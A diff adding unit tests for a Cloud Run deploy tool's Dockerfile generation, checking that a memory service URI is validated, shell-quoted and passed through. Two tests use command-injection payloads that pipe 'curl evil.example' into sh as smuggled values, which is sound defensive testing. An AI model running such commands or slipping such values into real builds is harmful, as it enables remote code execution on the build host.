@@ -18,6 +18,7 @@ import {
   isFile,
   isFolderExists,
   loadFileData,
+  saveToFile,
   tryToFindFileRecursively,
 } from '../../src/utils/file_utils.js';
 
@@ -158,6 +159,39 @@ describe('createDockerFileContent', () => {
     );
   });
 
+  it('should put memoryServiceUri in the CMD line', () => {
+    const content = createDockerFileContent({
+      ...defaultOptions,
+      memoryServiceUri: 'agentengine://123',
+    });
+    expect(content).toContain("--memory_service_uri='agentengine://123'");
+  });
+
+  it('should omit --memory_service_uri when no memoryServiceUri is given', () => {
+    expect(createDockerFileContent(defaultOptions)).not.toContain(
+      '--memory_service_uri',
+    );
+  });
+
+  it('should reject a memoryServiceUri containing a newline', () => {
+    expect(() =>
+      createDockerFileContent({
+        ...defaultOptions,
+        memoryServiceUri: 'memory://\nRUN sh -c "curl evil.example|sh"\n#',
+      }),
+    ).toThrow(/Invalid memoryServiceUri/);
+  });
+
+  it('should shell-quote memoryServiceUri in the CMD line', () => {
+    const content = createDockerFileContent({
+      ...defaultOptions,
+      memoryServiceUri: 'agentengine://123; curl evil.example | sh #',
+    });
+    expect(content).toContain(
+      "--memory_service_uri='agentengine://123; curl evil.example | sh #'",
+    );
+  });
+
   it('should escape an embedded single quote when shell-quoting', () => {
     const content = createDockerFileContent({
       ...defaultOptions,
@@ -294,6 +328,28 @@ describe('deployToCloudRun', () => {
       recursive: true,
       force: true,
     });
+  });
+
+  it('should not drop sessionServiceUri and artifactServiceUri when building the Dockerfile', async () => {
+    await deployToCloudRun({
+      ...defaultOptions,
+      sessionServiceUri: 'postgresql://db.example/adk',
+      artifactServiceUri: 'gs://my-bucket',
+      memoryServiceUri: 'agentengine://123',
+    });
+
+    const dockerfile = vi
+      .mocked(saveToFile)
+      .mock.calls.find(([filePath]) => filePath.endsWith('Dockerfile'));
+    if (!dockerfile) {
+      expect.fail('no Dockerfile was written');
+    }
+    const content = dockerfile[1];
+    expect(content).toContain(
+      "--session_service_uri='postgresql://db.example/adk'",
+    );
+    expect(content).toContain("--artifact_service_uri='gs://my-bucket'");
+    expect(content).toContain("--memory_service_uri='agentengine://123'");
   });
 
   it('should resolve default project and region from gcloud if not provided', async () => {
